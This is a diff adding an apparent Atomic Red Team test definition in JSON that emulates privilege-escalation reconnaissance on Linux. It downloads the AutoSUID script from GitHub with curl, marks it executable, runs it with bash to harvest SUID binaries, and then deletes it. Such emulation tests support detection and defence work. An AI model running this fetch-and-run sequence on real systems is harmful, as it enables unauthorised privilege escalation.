@@ -1,0 +1,111 @@
+{
+  "id": "46274fc6-08a7-4956-861b-24cbbaa0503c",
+  "name": "Harvest SUID executable files",
+  "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "4cb67792-4abc-4bd2-88bb-918020b0f564",
+      "type": "execute-command",
+      "data": {
+        "command": "chmod +x #{autosuid}\nbash #{autosuid}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "51fd3c8b-b90f-4111-b232-56d756c1505b",
+      "type": "execute-command",
+      "data": {
+        "command": "rm -rf #{autosuid}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fbc85970-ebe7-4882-9f31-98402c0fdb35",
+      "name": "Check dependency 1/1",
+      "description": "AutoSUID must exist on disk at specified location (#{autosuid})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7bda9203-2a00-4aaa-acb0-f66732bd6baa",
+      "name": "Resolve dependency 1/1",
+      "description": "AutoSUID must exist on disk at specified location (#{autosuid})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "curl --create-dirs #{autosuid_url} --output #{autosuid}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ead976f8-6327-4795-a992-1a8127e8590b",
+      "name": "Re-check dependency 1/1",
+      "description": "AutoSUID must exist on disk at specified location (#{autosuid})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "4cb67792-4abc-4bd2-88bb-918020b0f564",
+      "p": "on-success",
+      "o": "51fd3c8b-b90f-4111-b232-56d756c1505b"
+    },
+    {
+      "s": "4cb67792-4abc-4bd2-88bb-918020b0f564",
+      "p": "on-failure",
+      "o": "51fd3c8b-b90f-4111-b232-56d756c1505b"
+    },
+    {
+      "s": "fbc85970-ebe7-4882-9f31-98402c0fdb35",
+      "p": "on-success",
+      "o": "4cb67792-4abc-4bd2-88bb-918020b0f564"
+    },
+    {
+      "s": "fbc85970-ebe7-4882-9f31-98402c0fdb35",
+      "p": "on-failure",
+      "o": "7bda9203-2a00-4aaa-acb0-f66732bd6baa"
+    },
+    {
+      "s": "7bda9203-2a00-4aaa-acb0-f66732bd6baa",
+      "p": "on-success",
+      "o": "ead976f8-6327-4795-a992-1a8127e8590b"
+    },
+    {
+      "s": "ead976f8-6327-4795-a992-1a8127e8590b",
+      "p": "on-failure",
+      "o": "4cb67792-4abc-4bd2-88bb-918020b0f564"
+    }
+  ],
+  "tags": [
+    "T1059.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "autosuid",
+      "type": "path",
+      "description": "Path to the autosuid shell script",
+      "value": "PathToAtomicsFolder/T1059.004/src/AutoSUID.sh"
+    },
+    {
+      "name": "autosuid_url",
+      "type": "url",
+      "description": "Path to download autosuid shell script",
+      "value": "https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh"
+    }
+  ]
+}
